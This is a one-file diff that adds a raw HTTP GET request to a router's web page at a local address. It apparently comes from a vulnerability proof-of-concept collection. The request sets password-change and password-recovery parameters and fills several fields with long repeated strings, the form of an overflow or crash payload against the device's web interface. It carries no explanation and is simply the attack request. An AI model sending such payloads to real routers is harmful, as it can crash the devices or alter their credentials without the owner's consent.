@@ -1,0 +1,6 @@
+GET /pls_wait.html?submit_flag=debuginfo.htm&sysLoginTimeOut=1&sysNewPasswd=1&sysOldPasswd=1&enable_password_recovery=22222222222222222222222222222222&answer2=1&question2=1&PWD_answer1=1&PWD_answer2=1&PWD_question2=22222222222222222222222222222222&hidden_enable_recovery=22222222&answer1=1&question1=1&PWD_question1=1 HTTP/1.1
+HOST: 192.168.0.50
+Cookie: uid=xhyxhy
+Content-Type: text/html
+Content-Length: 0
+
